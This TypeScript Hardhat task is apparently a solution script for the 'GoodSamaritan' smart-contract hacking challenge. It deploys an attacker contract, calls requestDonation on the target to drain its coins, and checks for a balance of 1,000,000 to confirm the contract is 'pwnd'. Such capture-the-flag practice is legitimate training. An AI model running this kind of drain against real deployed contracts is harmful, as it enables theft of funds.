import { GoodSamaritan, GoodSamaritanSolution, Coin } from "../typechain";
import { task, types } from "hardhat/config";
import { HardhatRuntimeEnvironment, TaskArguments } from "hardhat/types";

task("solveSamaritan", "Solves the Samaritan challenge")
    .addParam("samaritanAddress", "Address of the exploitable contract", undefined, types.string, false)
    .setAction(async (args: TaskArguments, hre: HardhatRuntimeEnvironment) => {
        if (!hre.ethers.utils.isAddress(args.samaritanAddress)) {
            throw new Error(`Invalid contract address format: ${args.samaritanAddress}`);
        }
        const goodSamaritanFactory = await hre.ethers.getContractFactory("GoodSamaritan");
        const goodSamaritan = (await goodSamaritanFactory.attach(args.samaritanAddress)) as GoodSamaritan;

        const goodSamaritanSolutionFactory = await hre.ethers.getContractFactory("GoodSamaritanSolution");
        const goodSamaritanSolution = (await goodSamaritanSolutionFactory.deploy()) as GoodSamaritanSolution;

        console.log("Deployed GoodSamaritanSolution at address:", goodSamaritanSolution.address);

        console.log("Cracking GoodSamaritan...");
        await goodSamaritanSolution.requestDonation(goodSamaritan.address);

        const coinAddress = await goodSamaritan.coin();
        const CoinFactory = await hre.ethers.getContractFactory("Coin");
        const coin = CoinFactory.attach(coinAddress) as Coin;

        const balance = await coin.balances(goodSamaritanSolution.address);

        console.log("GoodSamaritanSolution balance:", balance.toString());

        if (balance.eq(1000000)) {
            console.log("GoodSamaritan is pwnd!");
        } else {
            console.log("GoodSamaritan is NOT pwnd!");
        }
    });
